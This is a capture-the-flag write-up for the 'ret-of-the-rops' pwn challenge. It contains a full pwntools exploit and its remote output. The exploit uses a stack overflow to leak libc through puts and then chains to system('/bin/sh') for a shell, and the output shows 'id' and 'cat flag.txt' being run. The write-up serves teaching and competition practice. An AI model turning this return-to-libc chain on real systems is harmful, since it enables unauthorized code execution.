## ret-of-the-rops

```
Is ROP dead? God no. But it returns from a long awaited time, this time in a weird fashion. Three instructions ... can you pwn it?

EU instance: 161.97.176.150 2222

US instance: 185.172.165.118 2222

author: Tango
```

Tags: _pwn_ _bof_ _rop_ _x86-64_

Exploit:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./ret-of-the-rops')
libc = binary.libc

if args.REMOTE:
	p = remote('185.172.165.118', 2222)

	import hashlib, string
	from itertools import product

	p.recvuntil(' = ')
	challenge = p.recvline().strip()
	log.info('challenge: ' + challenge.decode())

	chrset = string.ascii_lowercase
	for i in product(chrset, repeat = 4):
		nonce = ''.join(i).encode()
		if challenge.decode() == hashlib.md5(nonce).hexdigest()[-6:]:
			log.info('nonce: ' + nonce.decode())
			break

	p.sendline(nonce)
else:
	p = process(binary.path)

pop_rdi = next(binary.search(asm('pop rdi; ret')))

payload  = b''
payload += 0x28 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.main)

p.sendlineafter('say?\n',payload)
null = payload.find(b'\x00')
p.recv(null)

_ = p.recv(6)
puts = u64(_ + b'\0\0')
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

payload  = b''
payload += 0x28 * b'A'
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)

p.sendlineafter('say?\n',payload)
null = payload.find(b'\x00')
p.recv(null)

p.interactive()
```

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/0x41414141ctf2021/ret_of_the_rops/ret-of-the-rops'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 185.172.165.118 on port 2222: Done
[*] challenge: 15bec8
[*] nonce: ccop
[*] libc.address: 0x7f8c76214000
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag.txt
flag{w3_d0n't_n33d_n0_rdx_g4dg3t,ret2csu_15_d3_w4y_7821243}
```
